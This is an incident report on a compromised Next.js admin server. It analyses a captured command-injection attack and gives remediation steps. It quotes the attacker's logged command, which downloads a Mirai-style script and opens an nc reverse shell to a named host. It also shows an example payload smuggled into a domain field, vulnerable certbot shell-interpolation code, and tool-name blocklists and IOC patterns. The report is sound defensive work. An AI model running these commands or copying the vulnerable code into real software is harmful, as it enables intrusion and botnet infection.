# CRITICAL SECURITY INCIDENT REPORT

**Date:** December 26, 2025
**Severity:** CRITICAL (P0)
**Status:** ACTIVE COMPROMISE
**Prepared For:** Senior Management

---

## EXECUTIVE SUMMARY

The server hosting the YCH applications has been **ACTIVELY COMPROMISED** through a **Remote Code Execution (RCE) vulnerability**. Attackers exploited a **Command Injection vulnerability** in the site creation API to download and execute malware, establish reverse shell connections, and potentially install botnet software.

### Key Findings:
1. Server is executing malicious commands from external attackers
2. Botnet malware was downloaded and attempted to execute
3. Reverse shell connection attempted to attacker-controlled server
4. 100% CPU usage caused by malicious processes
5. Root cause: **Unsanitized user input passed to shell commands**

---

## PART 1: ATTACK ANALYSIS

### 1.1 Malicious Activity Detected

From the PM2 error logs, we observed:

```
Command failed: cd /tmp; wget -O /tmp/x.sh http://94.154.35.154/weball.sh ; chmod +x /tmp/x.sh; sh /tmp/x.sh; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 193.142.147.209 12323 >/tmp/f
```

### 1.2 Attack Breakdown

| Step | Action | Purpose |
|------|--------|---------|
| 1 | `cd /tmp` | Change to temp directory |
| 2 | `wget -O /tmp/x.sh http://94.154.35.154/weball.sh` | Download malware script |
| 3 | `chmod +x /tmp/x.sh` | Make it executable |
| 4 | `sh /tmp/x.sh` | Execute the malware |
| 5 | `mkfifo /tmp/f` | Create named pipe |
| 6 | `cat /tmp/f\|/bin/sh -i 2>&1\|nc 193.142.147.209 12323 >/tmp/f` | Establish reverse shell |

### 1.3 Attacker Infrastructure

| IP Address | Role | Port |
|------------|------|------|
| `94.154.35.154` | Malware Distribution Server | 80 (HTTP) |
| `193.142.147.209` | Command & Control (C2) Server | 12323 |

### 1.4 Malware Downloaded

The `weball.sh` script downloaded multiple architecture-specific binaries (Mirai-style botnet):

| Binary | Architecture | Size |
|--------|-------------|------|
| `x86_64.uhavenobotsxd` | 64-bit Intel/AMD | 92KB |
| `x86_32.uhavenobotsxd` | 32-bit Intel/AMD | 87KB |
| `arm.uhavenobotsxd` | ARM (generic) | 104KB |
| `arm5.uhavenobotsxd` | ARM v5 | 100KB |
| `arm6.uhavenobotsxd` | ARM v6 | 112KB |
| `arm7.uhavenobotsxd` | ARM v7 | 132KB |
| `mips.uhavenobotsxd` | MIPS (big-endian) | 131KB |
| `mipsel.uhavenobotsxd` | MIPS (little-endian) | 133KB |
| `powerpc.uhavenobotsxd` | PowerPC | 96KB |
| `sparc.uhavenobotsxd` | SPARC | 21KB |
| `m68k.uhavenobotsxd` | Motorola 68000 | 21KB |
| `sh4.uhavenobotsxd` | SuperH | 21KB |

**Note:** The "uhavenobotsxd" naming is characteristic of **Mirai botnet variants**, used for DDoS attacks and cryptomining.

### 1.5 Why 100% CPU Usage

1. **Botnet processes**: If any binary executed successfully, it would consume CPU
2. **Repeated attack attempts**: The attack is running repeatedly (visible in logs at different timestamps)
3. **Reverse shell processes**: Active network connections consume resources
4. **Process spawning**: Each malicious command spawns child processes

---

## PART 2: VULNERABILITY ANALYSIS

### 2.1 Root Cause: Command Injection Vulnerability

**Location:** Multiple files in the Admin Dashboard application

#### Vulnerable File #1: `lib/local.ts`

```typescript
// Line 98-107
export async function installSSLCertificate(domain: string): Promise<boolean> {
    try {
        // VULNERABLE: domain is directly interpolated into shell command
        const { stdout, stderr } = await execAsync(
            `sudo certbot --nginx -d ${domain} --non-interactive --agree-tos --register-unsafely-without-email`
        );
        return true;
    } catch (error) {
        return false;
    }
}
```

#### Vulnerable File #2: `lib/cloudflare.ts`

```typescript
// Lines 152-167
export async function removeServerSSL(domain: string): Promise<boolean> {
    // VULNERABLE: domain is directly interpolated
    const revokeCommand = `sudo certbot revoke --cert-path /etc/letsencrypt/live/${domain}/fullchain.pem...`;
    exec(revokeCommand, ...);

    // VULNERABLE: domain is directly interpolated again
    const deleteCommand = `sudo certbot delete --cert-name ${domain}`;
    exec(deleteCommand, ...);
}
```

### 2.2 Attack Vector (How It Works)

1. **Attacker sends request to `/api/site/create`** with malicious domain:
   ```
   domain = "test.com; wget http://malicious.com/script.sh -O /tmp/x.sh && sh /tmp/x.sh; #"
   ```

2. **Application passes domain to `installSSLCertificate()`**

3. **Shell command becomes:**
   ```bash
   sudo certbot --nginx -d test.com; wget http://malicious.com/script.sh -O /tmp/x.sh && sh /tmp/x.sh; # --non-interactive...
   ```

4. **Shell interprets `;` as command separator**, executing:
   - `sudo certbot --nginx -d test.com`
   - `wget http://malicious.com/script.sh -O /tmp/x.sh`
   - `sh /tmp/x.sh`
   - Everything after `#` is a comment

### 2.3 Entry Points

| File | Endpoint | Function | Risk |
|------|----------|----------|------|
| `app/api/site/create/route.ts:355` | POST `/api/site/create` | `createLocalConfig(domain)` | CRITICAL |
| `app/api/site/create/route.ts:422` | POST `/api/site/create` | `installSSLCertificate(domain)` | CRITICAL |
| `app/api/site/delete/route.ts:57` | DELETE `/api/site/delete` | `removeServerSSL(domain)` | CRITICAL |

### 2.4 Missing Security Controls

| Control | Status | Impact |
|---------|--------|--------|
| Domain input validation | MISSING | Allows malicious characters |
| Domain regex pattern | MISSING | No format enforcement |
| Shell command sanitization | MISSING | Allows command injection |
| Input encoding | MISSING | Special characters not escaped |
| Parameterized commands | NOT USED | Direct string interpolation |

---

## PART 3: ADDITIONAL SECURITY CONCERNS

### 3.1 Authentication Issues

| Issue | Location | Severity |
|-------|----------|----------|
| Hardcoded fallback JWT secret | `route.ts:300` | HIGH |
| JWT secret in code: `"your-secret-key"` | Multiple files | HIGH |

```typescript
// INSECURE: Hardcoded fallback secret
jwt.verify(token, process.env.JWT_SECRET || "your-secret-key")
```

### 3.2 Potential SSRF (Server-Side Request Forgery)

| Location | Issue |
|----------|-------|
| `app/api/site/create/route.ts:512` | Fetches user-provided `logoUrl` |
| `app/api/site/create/route.ts:575` | Fetches user-provided `faviconUrl` |

These endpoints fetch URLs provided by users without validation, potentially allowing:
- Internal network scanning
- Cloud metadata access (169.254.169.254)
- Denial of service through slow responses

### 3.3 Information Disclosure

| Issue | Location |
|-------|----------|
| Detailed error messages | Multiple API responses |
| Stack traces in logs | Error handlers |
| Internal paths exposed | Error messages |

---

## PART 4: IMMEDIATE ACTIONS REQUIRED

### 4.1 Emergency Response (Do NOW)

```bash
# 1. Stop PM2 processes
pm2 stop all

# 2. Kill any suspicious processes
pkill -f "uhavenobotsxd"
pkill -f "nc.*12323"

# 3. Remove malware files
rm -rf /tmp/*.sh
rm -rf /tmp/*uhavenobotsxd*
rm -rf /tmp/f

# 4. Block attacker IPs (firewall)
iptables -A OUTPUT -d 94.154.35.154 -j DROP
iptables -A OUTPUT -d 193.142.147.209 -j DROP
iptables -A INPUT -s 94.154.35.154 -j DROP
iptables -A INPUT -s 193.142.147.209 -j DROP

# 5. Check for running malware
ps aux | grep -E "uhavenobotsxd|nc.*12323|wget|curl.*154"

# 6. Check for cron jobs added by attacker
crontab -l
cat /etc/crontab

# 7. Check for SSH keys added by attacker
cat ~/.ssh/authorized_keys
```

### 4.2 System Forensics

```bash
# Check for persistent malware
find / -name "*uhavenobotsxd*" 2>/dev/null
find /tmp -type f -executable 2>/dev/null
find / -mtime -1 -type f 2>/dev/null | head -100

# Check network connections
netstat -tulpn | grep -E "12323|ESTABLISHED"
ss -tulpn

# Check for modified system files
rpm -Va 2>/dev/null || dpkg --verify 2>/dev/null
```

---

## PART 5: CODE FIXES REQUIRED

### 5.1 Create Domain Validation Function

Add to `lib/utils.ts`:

```typescript
/**
 * Validates and sanitizes a domain name
 * Returns null if invalid, sanitized domain if valid
 */
export function validateDomain(domain: string): string | null {
    if (!domain || typeof domain !== 'string') {
        return null;
    }

    // Trim and lowercase
    const cleaned = domain.toLowerCase().trim();

    // Strict domain regex pattern
    // Only allows: letters, numbers, hyphens, dots
    // Format: subdomain.domain.tld or domain.tld
    const domainRegex = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$/;

    if (!domainRegex.test(cleaned)) {
        return null;
    }

    // Additional checks
    if (cleaned.length > 253) return null;
    if (cleaned.includes('..')) return null;
    if (cleaned.startsWith('-') || cleaned.endsWith('-')) return null;
    if (cleaned.startsWith('.') || cleaned.endsWith('.')) return null;

    // Block dangerous patterns
    const dangerousPatterns = [
        ';', '|', '&', '$', '`', '(', ')', '{', '}', '[', ']',
        '<', '>', '"', "'", '\\', '\n', '\r', '\t', ' ',
        'wget', 'curl', 'bash', 'sh', 'nc', 'netcat'
    ];

    for (const pattern of dangerousPatterns) {
        if (cleaned.includes(pattern)) {
            return null;
        }
    }

    return cleaned;
}
```

### 5.2 Fix lib/local.ts

Replace shell commands with safer alternatives:

```typescript
import { spawn } from 'child_process';

export async function installSSLCertificate(domain: string): Promise<boolean> {
    // Validate domain FIRST
    const validDomain = validateDomain(domain);
    if (!validDomain) {
        console.error('Invalid domain format:', domain);
        return false;
    }

    return new Promise((resolve) => {
        // Use spawn with array arguments (NO shell interpolation)
        const certbot = spawn('sudo', [
            'certbot',
            '--nginx',
            '-d', validDomain,
            '--non-interactive',
            '--agree-tos',
            '--register-unsafely-without-email'
        ], {
            shell: false  // CRITICAL: Disable shell interpretation
        });

        certbot.on('close', (code) => {
            resolve(code === 0);
        });

        certbot.on('error', (error) => {
            console.error('Certbot error:', error);
            resolve(false);
        });
    });
}
```

### 5.3 Fix lib/cloudflare.ts

```typescript
import { spawn } from 'child_process';

export async function removeServerSSL(domain: string): Promise<boolean> {
    const validDomain = validateDomain(domain);
    if (!validDomain) {
        console.error('Invalid domain for SSL removal:', domain);
        return false;
    }

    // Revoke certificate using spawn (safe)
    await new Promise((resolve) => {
        const revoke = spawn('sudo', [
            'certbot', 'revoke',
            '--cert-path', `/etc/letsencrypt/live/${validDomain}/fullchain.pem`,
            '--reason', 'cessation_of_operation'
        ], { shell: false });

        revoke.on('close', () => resolve(true));
        revoke.on('error', () => resolve(false));
    });

    // Delete certificate using spawn (safe)
    return new Promise((resolve) => {
        const del = spawn('sudo', [
            'certbot', 'delete',
            '--cert-name', validDomain
        ], { shell: false });

        del.on('close', (code) => resolve(code === 0));
        del.on('error', () => resolve(false));
    });
}
```

### 5.4 Fix API Endpoint (site/create)

Add validation at the start of `app/api/site/create/route.ts`:

```typescript
import { validateDomain } from '@/lib/utils';

export async function POST(req: NextRequest) {
    try {
        const formData = await req.formData();
        let domainInput = (formData.get("domain") as string);

        // VALIDATE DOMAIN IMMEDIATELY
        const domain = validateDomain(domainInput);
        if (!domain) {
            return NextResponse.json(
                { error: { domain: "Invalid domain format. Only letters, numbers, hyphens, and dots allowed." } },
                { status: 400 }
            );
        }

        // Continue with validated domain...
    }
}
```

### 5.5 Fix JWT Secret

Remove hardcoded fallback:

```typescript
// BEFORE (INSECURE)
jwt.verify(token, process.env.JWT_SECRET || "your-secret-key")

// AFTER (SECURE)
const jwtSecret = process.env.JWT_SECRET;
if (!jwtSecret) {
    throw new Error('JWT_SECRET environment variable is required');
}
jwt.verify(token, jwtSecret)
```

---

## PART 6: LONG-TERM SECURITY RECOMMENDATIONS

### 6.1 Immediate (This Week)

| Priority | Action | Owner |
|----------|--------|-------|
| P0 | Apply all code fixes above | Development |
| P0 | Rotate all secrets (JWT, API keys, DB passwords) | DevOps |
| P0 | Full malware scan of server | Security |
| P0 | Review all user accounts for unauthorized access | Admin |

### 6.2 Short-Term (This Month)

| Priority | Action |
|----------|--------|
| P1 | Implement rate limiting on all API endpoints |
| P1 | Add Web Application Firewall (WAF) |
| P1 | Enable detailed security logging |
| P1 | Implement Content Security Policy (CSP) |
| P1 | Add input validation library (e.g., Zod, Yup) |

### 6.3 Medium-Term (Next Quarter)

| Priority | Action |
|----------|--------|
| P2 | Security code audit by external team |
| P2 | Implement SIEM for log monitoring |
| P2 | Add automated security scanning in CI/CD |
| P2 | Implement principle of least privilege |
| P2 | Container isolation for shell commands |

### 6.4 Security Architecture Changes

1. **Isolate SSL Certificate Management**
   - Run certbot in a separate, sandboxed container
   - Use API-based certificate management (e.g., Certbot API, ACME libraries)
   - Never pass user input to shell commands

2. **Implement Defense in Depth**
   - Network segmentation
   - Separate databases for each tenant
   - API gateway with request validation

3. **Monitoring & Alerting**
   - Alert on shell command execution
   - Alert on outbound connections to unknown IPs
   - Alert on high CPU/memory usage

---

## PART 7: COMPLIANCE & LEGAL

### 7.1 Data Breach Considerations

If user data was accessed:
- GDPR notification required within 72 hours (EU users)
- User notification may be required
- Document all remediation actions

### 7.2 Evidence Preservation

Preserve the following for forensic analysis:
- PM2 logs (already captured)
- System logs (`/var/log/auth.log`, `/var/log/syslog`)
- Network logs
- Database access logs

---

## APPENDIX A: ATTACK TIMELINE

| Date/Time | Event |
|-----------|-------|
| 2025-12-23 15:31:00 | First malware download detected |
| 2025-12-23 15:31:08 | Multiple binary execution attempts |
| 2025-12-24 09:50:19 | Attack repeated (automated) |
| 2025-12-24 09:50:25 | Processes killed by system |

---

## APPENDIX B: INDICATORS OF COMPROMISE (IOC)

### Network IOCs
```
94.154.35.154    - Malware server
193.142.147.209  - C2 server
Port 12323       - Reverse shell port
```

### File IOCs
```
/tmp/x.sh
/tmp/weball.sh
*uhavenobotsxd*
/tmp/f (named pipe)
```

### Process IOCs
```
nc.*12323
wget.*94.154.35.154
curl.*94.154.35.154
./uhavenobotsxd
```

---

## APPENDIX C: AFFECTED FILES SUMMARY

| File | Line | Vulnerability |
|------|------|---------------|
| `lib/local.ts` | 101 | Command Injection (installSSLCertificate) |
| `lib/local.ts` | 48 | Command Injection (createLocalConfig) |
| `lib/local.ts` | 87 | Command Injection (removeFromHosts) |
| `lib/cloudflare.ts` | 152 | Command Injection (removeServerSSL) |
| `lib/cloudflare.ts` | 167 | Command Injection (removeServerSSL) |
| `api/site/create/route.ts` | 355 | Entry point (createLocalConfig) |
| `api/site/create/route.ts` | 422 | Entry point (installSSLCertificate) |
| `api/site/delete/route.ts` | 57 | Entry point (removeServerSSL) |

---

**Report Prepared By:** Security Analysis System
**Classification:** CONFIDENTIAL
**Distribution:** Senior Management, Security Team, Development Lead
